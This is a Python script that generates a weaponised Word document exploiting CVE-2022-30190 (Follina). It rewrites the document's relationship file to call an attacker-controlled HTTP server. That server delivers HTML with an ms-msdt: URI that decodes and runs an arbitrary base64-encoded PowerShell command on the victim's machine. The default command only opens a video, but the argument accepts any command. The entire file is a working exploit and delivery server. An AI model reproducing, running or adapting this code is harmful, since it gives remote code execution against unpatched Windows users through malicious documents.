#!/usr/bin/env python3

import argparse
import ipaddress
import netifaces
import os
import tempfile
import shutil
import base64
import random
import string
import socketserver
import socket
import http.server





"""
Creating Arguments Parsing
"""


parser = argparse.ArgumentParser()

parser.add_argument(
    "--command",
    "-c",
    default = 'start chrome.exe "https://www.youtube.com/watch?v=WYmZpTBNG4w&t=30s"',
    help = "command to run on the target machine (default: start chrome.exe \"https://www.youtube.com/watch?v=WYmZpTBNG4w&t=30s\")",
)

parser.add_argument(
    "--output",
    "-o",
    default = "./maldoc_CVE-2022-30190.doc",
    help = "output maldoc file (default: ./maldoc_CVE-2022-30190.doc)",
)

parser.add_argument(
    "--interface",
    "-i",
    default = "eth0",
    help = "network interface or IP address to host HTTP server (default: eth0)",
)

parser.add_argument(
    "--port",
    "-p",
    default = "8000",
    help = "port to serve the HTTP server (default: 8000)",
)


"""
Main function
    [+] Getting IP address from interface for maldoc knows what to reach out to.
    [+] Copy the Microsoft Word skeleton into a temporary staging folder.
    [+] Creating maldoc
    [+] Serve html payload
"""


def main(args):


    """ Getting IP address from interface for maldoc knows what to reach out to. """
    try:
        serve_host = ipaddress.IPv4Address(args.interface)
    except ipaddress.AddressValueError:
        try:
            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
                "addr"
            ]
        except ValueError:
            print(
                "[!] error detering http hosting address. did you provide an interface or ip?"
            )
            exit()


    """ Copy the Microsoft Word skeleton into a temporary staging folder. """
    doc_skeleton = "doc"
    temp_staging_dir = os.path.join(
        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
    )
    maldoc_path = os.path.join(temp_staging_dir, doc_skeleton)
    shutil.copytree(doc_skeleton, os.path.join(temp_staging_dir, maldoc_path))
    print(f"[+] Copied Microsoft Word skeleton {temp_staging_dir}")

    # Prepare a temporary HTTP server location
    serve_path = os.path.join(temp_staging_dir, "www")
    os.makedirs(serve_path)

    """ Creating maldoc step """
    # Modify maldoc_CVE-2022-30190 to include our HTTP server
    rels_path = os.path.join(
        temp_staging_dir, doc_skeleton, "word", "_rels", "document.xml.rels"
    )

    with open(rels_path) as file:
        modify_rels_xml = file.read()

    modify_rels_xml = modify_rels_xml.replace(
        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
    )

    with open(rels_path, "w") as file:
        file.write(modify_rels_xml)

    # Rebuild the original of office file
    shutil.make_archive(args.output, "zip", maldoc_path)
    os.rename(args.output + ".zip", args.output)
    print(f"[+] Created maldoc {args.output}")



    """ Serve HTTP payload """
    command = args.command
    # Base64 encode our command return str
    base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
    html_payload += (
        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
        + "\n</script>"
    )


    # Create HTML endpoint
    with open(os.path.join(serve_path, "index.html"), "w") as file:
        file.write(html_payload)

    # Create basic webserver serving file
    class ReuseTCPServer(socketserver.TCPServer):
        def server_bind(self):
            # Setting socket option at the socket level(SOL_SOCKET)
            # The SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state,
            #                                   without waiting for its natural timeout to expire.
            #                                   1 parameter is (ON/true).
            # Avoid bind() exception: OSError: [Errno 48] Address already in use.
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Hosting server on local_address
            self.socket.bind(self.server_address)

    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=serve_path, **kwargs)

        def log_message(self, format, *func_args):
            super().log_message(format, *func_args)

        def log_request(self, format, *func_args):
            super().log_request(format, *func_args)

    def serve_http():
        with ReuseTCPServer(("", int(args.port)), Handler) as httpd:
            httpd.serve_forever()

    # Host the HTTP server on all interfaces
    print(f"[+] Serving html payload on :{args.port}")
    serve_http()




if __name__ == "__main__":

    main(parser.parse_args())
